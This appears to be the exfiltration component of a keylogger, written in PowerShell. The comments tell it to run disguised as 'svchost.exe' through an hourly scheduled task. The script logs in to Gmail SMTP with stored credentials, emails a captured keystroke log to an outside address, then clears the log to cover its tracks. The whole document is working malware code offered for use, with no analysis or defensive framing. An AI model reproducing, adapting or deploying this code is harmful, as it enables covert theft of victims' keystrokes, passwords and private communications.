#Send keys to email c2 server
#################################
# 	Run: svchost.exe            #
#   Task Sch: this every hour   #
#################################
$message="keylog data from $env:computername"

if($message -ne $null) {
	$SendAddress="bright7hat@gmail.com"
	$SMTPServer="smtp.gmail.com"
	$SMTPPort="587"

	$enc=Get-Content 'C:\Users\Public\pass.txt'
	$password=ConvertTo-SecureString $env:pass -AsPlainText -Force

	$creds= New-Object System.Management.Automation.PSCredential ($SendAddress,$password) 
	$user=gwmi -class Win32_ComputerSystem | select username | grep $env:computername | %{ $_.Split('\')[1]; }

	Send-MailMessage -From $SendAddress -to "brytonjherdes@gmail.com" -Subject "Keyscan" `
	-Body " $message" -Attachments "C:\users\public\System32Log.txt" `
	-SmtpServer $SMTPServer -port $SMTPPort -UseSsl -Credential $creds 

	Clear-Content -Path 'C:\Users\Public\System32Log.txt'
}

$message=""


